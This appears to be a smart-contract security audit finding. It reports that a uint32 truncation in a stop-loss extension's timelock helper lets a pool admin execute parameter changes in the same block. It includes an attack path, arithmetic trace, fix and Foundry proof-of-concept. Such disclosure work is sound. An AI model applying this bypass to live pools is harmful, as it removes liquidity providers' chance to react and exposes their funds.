The key functions to trace are `_afterTimelock` and `_requireElapsed`. Let me verify the exact arithmetic.

The vulnerability is real. Here is the complete trace.

---

### Title
`uint32` Truncation in `_afterTimelock` Allows Pool Admin to Bypass Watermark Timelock Immediately — (`metric-periphery/contracts/extensions/OracleValueStopLossExtension.sol`)

---

### Summary

`_afterTimelock` casts `block.timestamp + timelock` to `uint32`. When `timelock = type(uint32).max`, the addition overflows the `uint32` domain and produces `executeAfter ≈ block.timestamp - 1`. The subsequent `_requireElapsed` check (`block.timestamp < executeAfter`) then evaluates to `false` and never reverts, so `executeOracleStopLossHighWatermarks` (and every other timelocked execute) succeeds in the same block as the proposal.

---

### Finding Description

**Overflow site:**

```solidity
// OracleValueStopLossExtension.sol line 297-299
function _afterTimelock(address pool_) private view returns (uint32) {
    return uint32(block.timestamp + oracleStopLossConfig[pool_].timelock);
}
``` [1](#0-0) 

`block.timestamp` is `uint256`; `timelock` is `uint32`. The addition is performed in `uint256` (no intermediate overflow), but the result is then **truncated** to `uint32`.

**Arithmetic with `timelock = type(uint32).max` and `block.timestamp ≈ 1.75 × 10⁹`:**

```
sum  = 1_750_000_000 + 4_294_967_295 = 6_044_967_295
uint32(6_044_967_295) = 6_044_967_295 mod 4_294_967_296
                      = 1_749_999_999
                      = block.timestamp - 1
```

So `executeAfter = uint32(block.timestamp - 1)`.

**Guard site:**

```solidity
// OracleValueStopLossExtension.sol line 301-303
function _requireElapsed(uint32 executeAfter) private view {
    if (block.timestamp < executeAfter) revert ...;
}
``` [2](#0-1) 

`executeAfter` is promoted to `uint256` for the comparison. The check becomes:

```
1_750_000_000 < 1_749_999_999  →  false  →  no revert
```

The execute succeeds immediately.

**Full attack path (pool initialized with `timelock = 0`):**

1. `proposeOracleStopLossTimelock(pool_, type(uint32).max)` — `executeAfter = uint32(block.timestamp + 0) = uint32(block.timestamp)`.
2. `executeOracleStopLossTimelock(pool_)` — check: `block.timestamp < uint32(block.timestamp)` → `false` → passes. `timelock` is now `type(uint32).max`.
3. `proposeOracleStopLossHighWatermarks(pool_, binIdx, newHwm0, newHwm1)` — `executeAfter = uint32(block.timestamp - 1)`.
4. `executeOracleStopLossHighWatermarks(pool_)` — check: `block.timestamp < uint32(block.timestamp - 1)` → `false` → passes. Watermarks applied in the same block. [3](#0-2) 

The same overflow applies to `proposeOracleStopLossDrawdown`, `proposeOracleStopLossDecay`, and `proposeOracleStopLossTimelock` itself — every timelocked operation shares the same `_afterTimelock` helper. [4](#0-3) 

---

### Impact Explanation

The timelock is the sole LP-protection mechanism against pool-admin parameter changes. The contract's own NatSpec states: *"Drawdown and decay changes are timelocked so LPs can react."* [5](#0-4) 

By bypassing the timelock, a malicious pool admin can:

- **Set watermarks to 0** — disables the stop-loss entirely; the `_applyWatermark` ratchet never triggers, removing all LP value-loss protection.
- **Set watermarks to an arbitrarily high value** — causes `OracleStopLossTriggered` to revert on the very next swap, permanently DoS-ing the pool's swap path.
- **Set drawdown/decay to 0** — silently removes the decay floor, making the watermark permanent and unresponsive.

All of these can be executed atomically, giving LPs zero blocks to react and exit.

---

### Likelihood Explanation

- Requires a malicious pool admin — a semi-trusted role explicitly constrained by timelocks.
- The prerequisite (`timelock = 0` at initialization, or waiting once for the current timelock to expire) is a realistic pool configuration.
- No external oracle data, non-standard tokens, or factory-owner privileges are needed.
- The overflow is deterministic and reproducible on any EVM chain with `block.timestamp > 0`.

---

### Recommendation

Cap the accepted timelock value and perform the addition in `uint256` before truncating, or validate that the result is strictly greater than `block.timestamp`:

```solidity
uint32 constant MAX_TIMELOCK = 365 days; // example cap

function _afterTimelock(address pool_) private view returns (uint32) {
    uint256 tl = oracleStopLossConfig[pool_].timelock;
    uint256 result = block.timestamp + tl;
    require(result <= type(uint32).max, "timelock overflow");
    return uint32(result);
}
```

Also add a cap in `proposeOracleStopLossTimelock` (and in `initialize`) so `newTimelock <= MAX_TIMELOCK`.

---

### Proof of Concept

```solidity
// Foundry test (pseudo-code)
function test_timelockOverflowBypass() public {
    // Pool initialized with timelock = 0
    uint32 MAX32 = type(uint32).max;

    // Step 1: propose timelock = type(uint32).max
    vm.prank(poolAdmin);
    ext.proposeOracleStopLossTimelock(pool, MAX32);
    // executeAfter = uint32(block.timestamp + 0) = uint32(block.timestamp)
    // _requireElapsed: block.timestamp < uint32(block.timestamp) → false → passes

    // Step 2: execute in same block
    vm.prank(poolAdmin);
    ext.executeOracleStopLossTimelock(pool);
    assertEq(ext.oracleStopLossConfig(pool).timelock, MAX32);

    // Step 3: propose watermarks
    vm.prank(poolAdmin);
    ext.proposeOracleStopLossHighWatermarks(pool, 0, 0, 0);
    // executeAfter = uint32(block.timestamp + MAX32) = uint32(block.timestamp - 1)

    // Step 4: execute in same block — should revert but doesn't
    vm.prank(poolAdmin);
    ext.executeOracleStopLossHighWatermarks(pool); // succeeds — timelock bypassed
}
```

### Citations

**File:** metric-periphery/contracts/extensions/OracleValueStopLossExtension.sol (L13-17)
```text
/// @title OracleValueStopLossExtension
/// @notice Tracks per-bin value per share in token0 and token1 terms at the oracle mid,
///         against decaying high watermarks. Drawdown and decay changes are timelocked so LPs
///         can react; monitor at least as often as the timelock or trust the pool admin.
/// @dev Value formulas (Q64.64 mid = token1 per token0), per-share in bin scaled units:
```

**File:** metric-periphery/contracts/extensions/OracleValueStopLossExtension.sol (L78-84)
```text
  function proposeOracleStopLossTimelock(address pool_, uint32 newTimelock) external onlyPoolAdmin(pool_) {
    PoolStopLossSchedule storage sched = _initializedSchedule(pool_);
    uint32 executeAfter = _afterTimelock(pool_);
    sched.pendingTimelock = newTimelock;
    sched.pendingTimelockExecuteAfter = executeAfter;
    emit OracleStopLossTimelockProposed(pool_, newTimelock, executeAfter);
  }
```

**File:** metric-periphery/contracts/extensions/OracleValueStopLossExtension.sol (L157-177)
```text
  function proposeOracleStopLossHighWatermarks(address pool_, int8 binIdx, uint104 newHwmToken0, uint104 newHwmToken1)
    external
    onlyPoolAdmin(pool_)
  {
    _requireInitialized(pool_);
    uint32 executeAfter = _afterTimelock(pool_);
    pendingHighWatermark[pool_] =
      PendingHighWatermarks({token0: newHwmToken0, token1: newHwmToken1, binIdx: binIdx, executeAfter: executeAfter});
    emit OracleStopLossHighWatermarkProposed(pool_, binIdx, newHwmToken0, newHwmToken1, executeAfter);
  }

  /// @notice Apply the pending watermarks. Also resets the decay clock for the bin.
  function executeOracleStopLossHighWatermarks(address pool_) external onlyPoolAdmin(pool_) {
    PendingHighWatermarks memory pending = pendingHighWatermark[pool_];
    if (pending.executeAfter == 0) revert OracleStopLossNoPendingHighWatermark(pool_);
    _requireElapsed(pending.executeAfter);
    highWatermarks[pool_][pending.binIdx] =
      BinHighWatermarks({token0: pending.token0, token1: pending.token1, lastDecayTs: uint32(block.timestamp)});
    delete pendingHighWatermark[pool_];
    emit OracleStopLossHighWatermarkUpdated(pool_, pending.binIdx, pending.token0, pending.token1);
  }
```

**File:** metric-periphery/contracts/extensions/OracleValueStopLossExtension.sol (L297-299)
```text
  function _afterTimelock(address pool_) private view returns (uint32) {
    return uint32(block.timestamp + oracleStopLossConfig[pool_].timelock);
  }
```

**File:** metric-periphery/contracts/extensions/OracleValueStopLossExtension.sol (L301-303)
```text
  function _requireElapsed(uint32 executeAfter) private view {
    if (block.timestamp < executeAfter) revert OracleStopLossTimelockNotElapsed(executeAfter, block.timestamp);
  }
```
